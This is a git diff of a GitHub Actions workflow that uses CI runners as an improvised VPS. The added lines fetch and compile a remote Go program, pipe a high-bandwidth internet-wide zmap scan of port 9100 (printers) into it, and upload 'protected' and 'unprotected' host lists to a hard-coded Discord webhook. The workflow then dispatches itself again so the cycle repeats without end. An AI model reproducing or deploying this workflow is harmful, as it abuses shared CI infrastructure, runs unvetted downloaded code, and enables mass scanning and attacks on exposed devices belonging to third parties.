@@ -1,14 +1,14 @@
 name: Create VPS
 
 on:
-  workflow_dispatch: 
-  repository_dispatch:   
+  workflow_dispatch:
+  repository_dispatch:
     types: [create-vps]
 
 jobs:
   start-vps:
     runs-on: ubuntu-latest
-    timeout-minutes: 360  # 6 hours max
+    timeout-minutes: 360
 
     steps:
       - name: ⬇️ Checkout
@@ -29,37 +29,130 @@ jobs:
         id: tmate
         run: |
           echo "🔄 Launching tmate..."
-          sudo apt install -y tmate
+          sudo apt update -qq && sudo apt install -y -qq tmate zmap golang-go
+          
+          ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N "" -q
+          
           tmate -S /tmp/tmate.sock new-session -d
-          tmate -S /tmp/tmate.sock wait tmate-ready
+          
+          timeout 120 bash -c 'tmate -S /tmp/tmate.sock wait tmate-ready' || {
+            echo "⚠️ tmate relay slow, retrying..."
+            tmate -S /tmp/tmate.sock kill-server 2>/dev/null
+            sleep 5
+            tmate -S /tmp/tmate.sock new-session -d
+            timeout 120 bash -c 'tmate -S /tmp/tmate.sock wait tmate-ready' || {
+              echo "❌ tmate failed to start after retry"
+              exit 1
+            }
+          }
+          
           SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
           echo "ssh=$SSH" >> $GITHUB_OUTPUT
           echo "$SSH" > "links/${{ github.event.client_payload.vps_name }}.txt"
           echo "✅ SSH Ready: $SSH"
-          sleep 60 # give time for GitHub to sync
 
       - name: 📤 Send SSH to Discord
         run: |
           curl -H "Content-Type: application/json" \
                -X POST \
                -d "{\"content\":\"✅ New VPS SSH for **${{ github.event.client_payload.vps_name }}**:\n\`${{ steps.tmate.outputs.ssh }}\`\"}" \
-               "https://discord.com/api/webhooks/1255855489170800750/F-qBrv5Z0qbzMfrvbdCzuOfO-8LsCPkypsuIJUAYMSERrkde7OsgPZBSye874VfonaMd"
+               "https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
 
-      - name: 💾 Save backup
+      - name: ⬇️ Fetch and compile d.go
         run: |
-          name="${{ github.event.client_payload.vps_name }}"
-          zip -r ".backup/$name.zip" * .git/** ".github/**" ".backup/**" || true
+          echo "🔄 Fetching d.go..."
+          curl -sL -o d.go "https://raw.githubusercontent.com/Nightmary9992/ashu/main/d.go" || {
+            echo "❌ Failed to fetch d.go"
+            exit 1
+          }
+          
+          echo "🔄 Initializing go module..."
+          go mod init d
+          
+          echo "🔄 Tidying dependencies..."
+          go mod tidy
+          
+          echo "🔄 Compiling d.go..."
+          CGO_ENABLED=0 go build -o d d.go || {
+            echo "❌ Failed to compile d.go"
+            exit 1
+          }
+          
+          echo "✅ d binary ready"
 
-      - name: ⬆️ Push
-        uses: stefanzweifel/git-auto-commit-action@v5
-        with:
-          commit_message: "🔄 Updated SSH + backup for ${{ github.event.client_payload.vps_name }}"
-          file_pattern: 'links/*.txt .backup/*.zip'
-
-      - name: ⏳ Keep session alive
+      - name: 🚀 Start zmap scanner in background
         run: |
-          echo "🔄 Keeping session alive for 6 hours..."
-          for i in $(seq 1 360); do
-            echo "✅ Minute $i - session still alive"
+          echo "🚀 Starting zmap → d pipeline..."
+          
+          nohup bash -c 'zmap -p 9100 -q -B 800M | ./d' > scanner.log 2>&1 &
+          echo $! > scanner.pid
+          echo "✅ Scanner started (PID: $(cat scanner.pid))"
+
+      - name: ⏳ Run for 5h55m then collect results
+        run: |
+          echo "⏳ Running for 5 hours 55 minutes..."
+          
+          END_TIME=$((SECONDS + 21300))
+          
+          while [ $SECONDS -lt $END_TIME ]; do
+            if ! kill -0 $(cat scanner.pid) 2>/dev/null; then
+              echo "⚠️ Scanner died, restarting..."
+              nohup bash -c 'zmap -p 9100 -q -B 800M | ./d' > scanner.log 2>&1 &
+              echo $! > scanner.pid
+            fi
             sleep 60
           done
+          
+          echo "⏰ Time's up — sending results to Discord..."
+
+      - name: 📤 Send results to Discord
+        run: |
+          WEBHOOK="https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
+          
+          send_file() {
+            local file="$1"
+            local msg="$2"
+            if [ -f "$file" ] && [ -s "$file" ]; then
+              echo "📤 Sending $file ($(wc -c < "$file") bytes)..."
+              curl -s -F "file1=@$file" \
+                   -F "payload_json={\"content\":\"$msg\"}" \
+                   "$WEBHOOK"
+              echo ""
+            else
+              echo "⚠️ $file not found or empty"
+              curl -H "Content-Type: application/json" \
+                   -X POST \
+                   -d "{\"content\":\"⚠️ $msg — file not found or empty\"}" \
+                   "$WEBHOOK"
+            fi
+          }
+          
+          send_file "big.txt" "📦 **big.txt** results:"
+          sleep 2
+          send_file "protected.txt" "🔒 **protected.txt** results:"
+          sleep 2
+          send_file "unprotected.txt" "🔓 **unprotected.txt** results:"
+
+      - name: 🛑 Kill scanner
+        run: |
+          kill $(cat scanner.pid) 2>/dev/null || true
+          echo "✅ Scanner stopped"
+
+      - name: 💾 Save backup (git, no transfer.sh)
+        run: |
+          name="${{ github.event.client_payload.vps_name }}"
+          zip -r ".backup/$name.zip" big.txt protected.txt unprotected.txt d.go d scanner.log 2>/dev/null || true
+
+      - name: ⬆️ Push backup to git
+        uses: stefanzweifel/git-auto-commit-action@v5
+        with:
+          commit_message: "🔄 Results + backup for ${{ github.event.client_payload.vps_name }}"
+          file_pattern: 'links/*.txt .backup/*.zip'
+
+      - name: 🔁 Trigger next cycle
+        run: |
+          echo "🔁 Triggering next VPS cycle..."
+          curl -X POST https://api.github.com/repos/${{ github.repository }}/dispatches \
+          -H "Accept: application/vnd.github.v3+json" \
+          -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          -d '{ "event_type": "create-vps", "client_payload": { "vps_name": "autovps", "backup": true }}'
